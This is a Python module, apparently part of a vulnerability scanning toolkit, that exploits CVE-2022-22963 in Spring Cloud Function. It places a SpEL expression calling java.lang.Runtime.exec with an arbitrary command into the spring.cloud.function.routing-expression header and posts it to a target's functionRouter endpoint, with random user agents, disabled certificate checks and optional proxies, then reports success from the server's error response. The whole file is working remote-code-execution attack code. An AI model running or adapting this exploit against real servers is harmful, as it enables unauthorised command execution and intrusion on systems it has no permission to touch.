# coding:utf-8

import requests
from util import RandomUA
from util.Translate import tr

class CVE_2022_22963:
    def __init__(self):
        ua = RandomUA.RandomUA()
        self.ua = ua.UserAgent()

        self.data = 'test'

        self.path = 'functionRouter'
    def poc(self,url,proxies,ProxyStute,cmd="whoami"):
        payload = f'T(java.lang.Runtime).getRuntime().exec("{cmd}")'
        self.header = {
            'spring.cloud.function.routing-expression': payload,
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Accept-Language': 'en',
            'User-Agent': self.ua,
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        if ProxyStute == 1:
            proxies = proxies
        else:
            proxies = None
        try:
            url = url + self.path
            requests.packages.urllib3.disable_warnings()

            req = requests.post(url=url,headers=self.header,
                                    data=self.data,verify=False,proxies=proxies,timeout=6)
            code = req.status_code
            text = req.text
            rsp = '"error":"Internal Server Error"'
            if code == 500 and rsp in text:
                result = tr("v.22963.found", url=url, cmd=cmd)
                return result
            else:
                result = tr("v.22963.none", url=url)
                return result
        except Exception as e:
            error = tr("v.unknown", url=url, e=e)
            return error

    def exp(self,url,proxies,ProxyStute,cmd):
        result = self.poc(url,proxies,ProxyStute,cmd)
        return result